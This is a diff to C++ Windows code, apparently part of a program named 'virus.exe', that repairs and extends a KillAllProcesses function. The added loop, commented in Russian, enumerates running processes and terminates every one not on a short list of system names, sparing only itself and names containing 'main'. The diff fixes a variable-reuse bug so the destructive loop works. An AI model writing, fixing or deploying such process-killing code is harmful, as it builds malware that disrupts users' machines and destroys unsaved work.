@@ -26,7 +26,8 @@ void KillAllProcesses() {
             continue;
         }
 
-        PROCESSENTRY32 pe = { sizeof(pe) };
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
         if (Process32First(snapshot, &pe)) {
             do {
                 for (const auto& target : targets) {
@@ -43,11 +44,14 @@ void KillAllProcesses() {
         }
         CloseHandle(snapshot);
 
+        // Убиваем все несистемные процессы
         snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (snapshot != INVALID_HANDLE_VALUE) {
-            if (Process32First(snapshot, &pe)) {
+            PROCESSENTRY32 pe2;
+            pe2.dwSize = sizeof(PROCESSENTRY32);
+            if (Process32First(snapshot, &pe2)) {
                 do {
-                    std::string processName = pe.szExeFile;
+                    std::string processName = pe2.szExeFile;
                     bool isSystem = false;
                     std::string systemProcesses[] = {
                         "System", "svchost.exe", "winlogon.exe", "csrss.exe",
@@ -62,13 +66,13 @@ void KillAllProcesses() {
 
                     if (!isSystem && processName != "virus.exe" &&
                         processName.find("main") == std::string::npos) {
-                        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe2.th32ProcessID);
                         if (process) {
                             TerminateProcess(process, 0);
                             CloseHandle(process);
                         }
                     }
-                } while (Process32Next(snapshot, &pe));
+                } while (Process32Next(snapshot, &pe2));
             }
             CloseHandle(snapshot);
         }
